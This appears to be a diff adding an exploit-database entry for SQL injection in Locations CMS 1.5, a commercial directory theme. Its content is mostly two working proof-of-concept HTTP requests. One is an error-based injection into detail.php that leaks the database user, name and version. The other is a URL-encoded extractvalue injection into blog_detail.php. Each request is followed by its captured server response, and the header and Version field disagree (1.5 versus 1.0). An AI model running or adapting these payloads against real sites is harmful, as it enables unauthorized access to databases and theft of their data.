@@ -1,0 +1,70 @@
+# Exploit Title: Locations CMS 1.5 - SQL Injection
+# Dork: N/A
+# Date: 2019-01-13
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://themerig.com/
+# Software Link: https://codecanyon.net/item/locations-multipurpose-cms-directory-theme/21098597
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/detail.php?title=&id=[SQL]
+# 
+
+GET /[PATH]/detail.php?title=&id=2%27||(SeleCT%20%27Efe%27%20FroM%20duAL%20WheRE%20110=110%20AnD%20(seLEcT%20112%20frOM(SElecT%20CouNT(*),ConCAT(CONcat(0x203a20,UseR(),DAtaBASe(),VErsION()),(SeLEct%20(ELT(112=112,1))),FLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x)a))||%27 HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=3peclhdno4t80jmagl0gurf1o4
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+HTTP/1.1 200 OK
+X-Powered-By: PHP/5.6.39
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Type: text/html; charset=UTF-8
+Content-Length: 255
+Content-Encoding: br
+Vary: Accept-Encoding
+Date: Sun, 13 Jan 2019 15:59:33 GMT
+Accept-Ranges: bytes
+Server: LiteSpeed
+Alt-Svc: quic=":443"; ma=2592000; v="35,39,43"
+Connection: close
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/blog_detail.php?title=&id=[SQL]
+# 
+
+GET /[PATH]/blog_detail.php?title=&id=1%27%20%50%72%6f%63%65%64%75%72%65%20%41%6e%61%6c%79%73%65%20%28%65%78%74%72%61%63%74%76%61%6c%75%65%28%30%2c%63%6f%6e%63%61%74%28%30%78%32%37%2c%30%78%33%61%2c%40%40%76%65%72%73%69%6f%6e%29%29%2c%30%29%2d%2d%20%2d HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=3peclhdno4t80jmagl0gurf1o4
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+HTTP/1.1 200 OK
+X-Powered-By: PHP/5.6.39
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Type: text/html; charset=UTF-8
+Content-Length: 214
+Content-Encoding: br
+Vary: Accept-Encoding
+Date: Sun, 13 Jan 2019 16:02:16 GMT
+Accept-Ranges: bytes
+Server: LiteSpeed
+Alt-Svc: quic=":443"; ma=2592000; v="35,39,43"
+Connection: close
